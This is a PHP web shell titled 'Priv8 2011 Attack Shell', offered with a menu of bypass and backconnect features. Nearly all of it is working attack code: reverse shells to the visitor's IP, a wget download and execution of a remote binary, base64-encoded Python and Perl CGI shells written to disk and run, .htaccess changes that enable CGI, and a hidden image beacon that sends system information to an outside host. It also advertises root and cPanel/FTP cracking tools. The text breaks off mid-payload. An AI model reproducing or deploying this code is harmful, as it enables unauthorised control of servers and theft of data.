shell image:http://my.picresize.com/vault2/CY02MYRI70.jpg
shell
cgitelnetbypass1
cgishell bypass
python shell bypass
ssi bypass
php3.x bypass
safe_mode bypass
backconnect bypass
server site list
server site pageranks
suexec bypass
show source bypass
file read bypass
symlink all bypass
metasploit backconnect
eval code bypass
python backconnect
perl socket backconnect
php backconnect

coded by izleyici



shell code:

<BODY OnKeyPress="GetKeyCode();" text=#ffffff bottomMargin=0
bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0
marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse"
height=0 cellSpacing=0 borderColorDark=#666666 cellPadding=2
width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1
bordercolor="#C0C0C0"><tr><th width="101%" height="2" nowrap
bordercolor="#C0C0C0" valign="top" colspan="2"><center><font
color="#0033FF">
� � � � <pre>#Priv8 2011 Attack Shell#</pre>
� <hr>
� � � � <font face="Wingdings"><img border="0"
src="http://priv8.iblogger.org/s.php?'+<?echo "uname -a : "; echo
(php_uname())?>";" width="0" height="0"></a></font>
</font>
<a onclick="window.open('http://www.schliinberg.de/templates/pageranktara.php','POPUP','width=900
0,height=500,scrollbars=10');return false;"
href="http://www.schliinberg.de/templates/pageranktara.php"><font
color="red"><b>Server Pagerank</b></font></a>&nbsp;<a
onclick="window.open('http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php
echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900
0,height=500,scrollbars=10');return false;"
href="http://networktools.nl/reverseip/actionhandler&toolAction=toolReverseIP&toolInput=<?php
echo $_SERVER ['SERVER_ADDR']; ?>"><font color="green"><b>Site
list</b></font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_6"><font
color="yellow">Cgi Shell</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_7"><font color="white">Python
Shell</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_8&bypass=cp"><font color="blue">Symlink
Shell</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_9"><font
color="orange">perl Bypass Tools</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_10"><font color="yellow">Auto
Root</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_14"><font
color="red">Kullan&#305;c&#305; List</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_15"><font
color="pink">ShowsourceRead</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_11"><font color="orange">Cgi Shell Priv
pass=dz</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_16"><font
color="green">Config Shell</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_18"><font
color="orange">LitespeedBypas</font></a><br>&nbsp;&nbsp;<a
href="?BackConnect=PHP_19"><font
color="pink">SsiBypass</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_20"><font
color="red">SuExecByps</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_22"><font color="white">Wordpress Mysql Admin
Shell</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_23"><font
color="white">Joomla Mysql Admin Shell</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_24"><font color="white">Php Eval
Bypass</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_25"><font
color="white">Php4 Bind 8888 Eval</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_26"><font color="white">Cpanel+Ftp+Telnet
Cracker</font></a>&nbsp;&nbsp;<a href="?BackConnect=PHP_27"><font
color="white">Safe Mode php.ini</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_28"><font color="white">Mini
Cgi</font></a><br>&nbsp;&nbsp;<a href="?BackConnect=PHP_29"><font
color="red ">izo ozel ssi shell</font></a>&nbsp;&nbsp;<a
href="?BackConnect=PHP_30"><font color="red">Php3.0 Priv8
Bypass</font></a></td>
</center></th></tr><tr><td>
<?php
function printit ($string) {
� �if (!$daemon) {
� � � print "$string\n";
� �}
}
$bc = $_GET["BackConnect"];
switch($bc){
case "PHP_1":

set_time_limit (0);
$VERSION = "1.0";
$ip = $_SERVER["REMOTE_ADDR"];
$port = 22;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {

� �$pid = pcntl_fork();

� �if ($pid == -1) {
� � � printit("ERROR: Can't fork");
� � � exit(1);
� �}

� �if ($pid) {
� � � exit(0); �// Parent exits
� �}
� �if (posix_setsid() == -1) {
� � � printit("Error: Can't setsid()");
� � � exit(1);
� �}

� �$daemon = 1;
} else {
� �print("WARNING: Failed to daemonise. �This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
� �printit("$errstr ($errno)");
� �exit(1);
}

// Spawn shell process
$descriptorspec = array(
� �0 => array("pipe", "r"), �// stdin is a pipe that the child will read from
� �1 => array("pipe", "w"), �// stdout is a pipe that the child will write to
� �2 => array("pipe", "w") � // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
� �printit("ERROR: Can't spawn shell");
� �exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select
tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
� �// Check for end of TCP connection
� �if (feof($sock)) {
� � � printit("ERROR: Shell connection terminated");
� � � break;
� �}

� �// Check for end of STDOUT
� �if (feof($pipes[1])) {
� � � printit("ERROR: Shell process terminated");
� � � break;
� �}

� �// Wait until a command is end down $sock, or some
� �// command output is available on STDOUT or STDERR
� �$read_a = array($sock, $pipes[1], $pipes[2]);
� �$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

� �// If we can read from the TCP socket, send
� �// data to process's STDIN
� �if (in_array($sock, $read_a)) {
� � � if ($debug) printit("SOCK READ");
� � � $input = fread($sock, $chunk_size);
� � � if ($debug) printit("SOCK: $input");
� � � fwrite($pipes[0], $input);
� �}

� �// If we can read from the process's STDOUT
� �// send data down tcp connection
� �if (in_array($pipes[1], $read_a)) {
� � � if ($debug) printit("STDOUT READ");
� � � $input = fread($pipes[1], $chunk_size);
� � � if ($debug) printit("STDOUT: $input");
� � � fwrite($sock, $input);
� �}

� �// If we can read from the process's STDERR
� �// send data down tcp connection
� �if (in_array($pipes[2], $read_a)) {
� � � if ($debug) printit("STDERR READ");
� � � $input = fread($pipes[2], $chunk_size);
� � � if ($debug) printit("STDERR: $input");
� � � fwrite($sock, $input);
� �}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
break;
case "PHP_2":
� � � � � $ipim=$_SERVER["REMOTE_ADDR"];
� � � � �$portum="22";
� � � � �if ($ipim <> "")
� � � � �{
� � � � �$mucx=fsockopen($ipim , $portum , $errno, $errstr );
� � � � �if (!$mucx){
� � � � � � � �$result = "Error: didnt connect !!!";
� � � � �}
� � � � �else {

� � � � �$zamazing0="\n";
� � � � �fputs ($mucx ,"\nwelcome ZoRBaCK\n\n");
� � � � �fputs($mucx , system("uname -a") .$zamazing0 );
� � � � �fputs($mucx , system("pwd") .$zamazing0 );
� � � � �fputs($mucx , system("id") .$zamazing0.$zamazing0 );
� � � � �while(!feof($mucx)){
� � � � �fputs ($mucx);
� � � � $one="[$";
� � � � $two="]";
� � � � $result= fgets ($mucx, 8192);
� � � � $message=`$result`;
� � � �fputs ($mucx, $one. system("whoami") .$two. " " .$message."\n");
� � � }
� � � fclose ($mucx);
� � � � �}
� � � � �}

break;
case "PHP_3":
� � � � �$fipn=$_SERVER["REMOTE_ADDR"];
� � � � �$bportn="22";
� � � � �if ($fipn <> "")
� � � � �{
� � � � �$fp=fsockopen($fipn , $bportn , $errno, $errstr);
� � � � �if (!$fp){
� � � � � � � �$result = "Error: could not open socket connection";
� � � � �}
� � � � �else {
� � � � �fputs ($fp ,"\n
whoami
root
:)\n\n");
� � � while(!feof($fp)){
� � � �fputs ($fp);
� � � �$result= fgets ($fp, 4096);
� � � $message=`$result`;
� � � �fputs ($fp,"--> ".$message."\n");
� � � }
� � � fclose ($fp);
� � � � �}
� � � � �}
break;
case "PHP_4":
#!/usr/bin/perl
# �coded by izo
{
print "root by izo\n";
$fip=$_SERVER["REMOTE_ADDR"];
$bport="22";
system("wget http://paradiseinpuntagorda.com/images/dc");
system("chmod 777 dc");
system("./dc $fip $bport");
}
break;
case "PHP_5":
# �coded by izo
{
print "Ba&#287;lan&#305;l&#305;yor...\n";
$fipc=$_SERVER["REMOTE_ADDR"];
$bportc="22";
$izoemmi = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMjIyMjIyMjIyMjIyMjIyMjIyMjIwojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rCiMgICAgICAgICAgICAgICAgICAg
ICAgLl9fX19fX19fX19fX19fX19fX19fXy4gIHwKIyAgIGNvZGVkIGJ5IHNsYXYwbmljICB8IHNs
YXYwbmljMEBnbWFpbC5jb20gfCAgfCAgICAKIyAgICAgICAgICAgICAgICAgICAgICBeLS0tLS0t
LS0tLS0tLS0tLS0tLS0tXiAgfAojIHNpdGU6IHNsYXYwbmljLnhzcy5ydSAgICAgICAgICAgICAg
ICAgICAgICAgICB8CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLSsKI2ZvciBzZXR1cCBhIGxpc3RlbmluZyBwb3J0IG9uIHlvdXIgaG9zdDogbmMgLWwgLXAg
W3BvcnRdIAojVXNlOiBweXRob24gc2xfYmMucHkgW2hvc3RdIFtwb3J0XSB8fCBzbF9iYy5weSAt
ZGVmYXVsdCBzZXR0aW5ncwoKZnJvbSBzb2NrZXQgaW1wb3J0ICoKaW1wb3J0IG9zCmltcG9ydCBt
ZDUKaW1wb3J0IHN5cwoKIyMjIyMjIyMjIyNfRGVmYXVsdF8jIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMKaG9zdD0nbG9jYWxob3N0JyAgICAgICAgICAgICAgICAgICAgICAgICAgICAjCnBvcnQ9NjY2
NiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIwphdXRvY29tbWFuZHM9InVuc2V0
IEhJU1RGSUxFO3VuYW1lIC1hO2lkIiAgICMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMKaWYgbGVuKHN5cy5hcmd2KT4xOgogICAgaG9zdD1zeXMuYXJndlsxXQog
ICAgaWYgbGVuKHN5cy5hcmd2KT4yOgogICAgICAgIHBvcnQ9aW50KHN5cy5hcmd2WzJdKQpwcmlu
dCAiWytdaG9zdDpwb3J0PSAlczolaSIlKGhvc3QscG9ydCkKICAgICAgICAKaW5mbz1vcy5wb3Bl
bihhdXRvY29tbWFuZHMpLnJlYWQoKQp0cnk6CiAgICBzb2Nrb2JqPXNvY2tldChBRl9JTkVULFNP
Q0tfU1RSRUFNKQogICAgc29ja29iai5jb25uZWN0KChob3N0LHBvcnQpKQpleGNlcHQ6CiAgICBw
cmludCAnWy1dU29ja2V0RXJyb3InLHN5cy5leGNfdmFsdWUKICAgIHN5cy5leGl0KDEpCnNvY2tv
Ymouc2VuZCgiLjpiaW5ic2hlbGw6LlxuICVzIiVpbmZvKQpvcy5kdXAyKHNvY2tvYmouZmlsZW5v
KCksMikKb3MuZHVwMihzb2Nrb2JqLmZpbGVubygpLDEpCm9zLmR1cDIoc29ja29iai5maWxlbm8o
KSwwKQpvcy5leGVjbCgiL2Jpbi9zaCIsInNoIik=';
$file = fopen("conp" ,"w+");
$write = fwrite ($file ,base64_decode($izoemmi));
fclose($file);
chmod("conp" , 0777);
system("./conp $fipc $bportc");
}
break;
case "PHP_6":
� � mkdir('cgitelnet1', 0755);
� � chdir('cgitelnet1');
� � � � $kokdosya = ".htaccess";
� � � � $dosya_adi = "$kokdosya";
� � � � $dosya = fopen ($dosya_adi , 'w') or die ("Dosya
a&#231;&#305;lamad&#305;!");
� � � � $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";
� � � � fwrite ( $dosya , $metin ) ;
� � � � fclose ($dosya);
$cgishellizocin =
'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5w
cml2OCBjZ2kgc2hlbGw8L2I+ICMgc2VydmVyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdl
IG9ubHkgJFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcg0KIyB2YWx1ZXMgc2hvdWxkIHdv
cmsgZmluZSBmb3IgbW9zdCBzeXN0ZW1zLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFBhc3N3
b3JkID0gInByaXY4IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhp
cw0KCQkJCSMgdG8gbG9naW4uDQoNCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2Ug
dGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3Jp
cHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBv
biBVbml4LCB5b3UNCgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENt
ZFNlcCA9ICImIjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1h
bmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNl
cCA9ICI7IjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRz
DQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJh
dGlvbiA9IDEwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxl
ZA0KCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJ
CQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCSMgdGFr
ZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkjIFRoaXMgaXMgdmFs
aWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZl
cnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRh
IGlzIHNlbnQgdG8gdGhlDQoJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBv
dGhlcndpc2UNCgkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQN
CgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkj
IHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCSMgaXMgYmVp
bmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUg
VU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5U
ID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDog
InB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9
ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJz
ZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlw
YXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZp
bGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRp
bnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAk
aW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3Rl
OiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBD
R0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7
DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwp
Ow0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0
aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9N
RVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0N
CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUo
U1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGlu
LCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBk
YXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBi
b3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZl
ciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhl
YWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0K
CQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMg
dGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9
ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9
ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0K
CQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJ
CSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIv
Ow0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxu
fFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4
KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRh
cmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNw
bGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGld
ID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsN
CgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMv
JSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRl
ZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMg
QXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVk
Q3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEt
ekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTog
dGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPnBy
aXY4IGNnaSBzaGVsbDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCg0KPG1ldGEgbmFtZT0ia2V5
d29yZHMiIGNvbnRlbnQ9InByaXY4IGNnaSBzaGVsbCAgXyAgICAgaTVfQGhvdG1haWwuY29tIj4N
CjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJwcml2OCBjZ2kgc2hlbGwgIF8gICAg
aTVfQGhvdG1haWwuY29tIj4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5m
b2N1cygpIiBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1h
cmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRjAwMDAiPg0KPHRhYmxlIGJv
cmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8
dHI+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJj
ZW50ZXIiIHdpZHRoPSIxJSI+DQo8Yj48Zm9udCBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0K
PHRkIGJnY29sb3I9IiNGRkZGRkYiIHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNp
emU9IjIiPjxiPiANCjxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZm
NjYiPnByaXY4IGNnaSBzaGVsbDwvYj4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9u
dD48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjRkZGRkZGIj48
Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj4NCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9u
P2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VXBs
b2FkIEZpbGU8L2ZvbnQ+PC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxv
YWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5Eb3dubG9hZCBG
aWxlPC9mb250PjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij48Zm9u
dCBjb2xvcj0iI0ZGMDAwMCI+RGlzY29ubmVjdDwvZm9udD48L2E+IHwNCjwvZm9udD48L3RkPg0K
PC90cj4NCjwvdGFibGU+DQo8Zm9udCBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8L2ZvbnQ+PGgxPnBh
c3M9cHJpdjg8L2gxPjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48cHJlPjxpbWcgYm9y
ZGVyPSIwIiBzcmM9Imh0dHA6Ly93d3cucHJpdjguaWJsb2dnZXIub3JnL3MucGhwPytjZ2l0ZWxu
ZXQgc2hlbGwiIHdpZHRoPSIwIiBoZWlnaHQ9IjAiPjwvcHJlPg0KJDsNCiMnDQoJcHJpbnQgPDxF
TkQ7DQo8Y29kZT4NCg0KVHJ5aW5nICRTZXJ2ZXJOYW1lLi4uPGJyPg0KQ29ubmVjdGVkIHRvICRT
ZXJ2ZXJOYW1lPGJyPg0KRXNjYXBlIGNoYXJhY3RlciBpcyBeXQ0KPGNvZGU+JE1lc3NhZ2UNCkVO
RA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0
IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+
DQo8YnI+bG9naW46IGFkbWluPGJyPg0KcGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJy
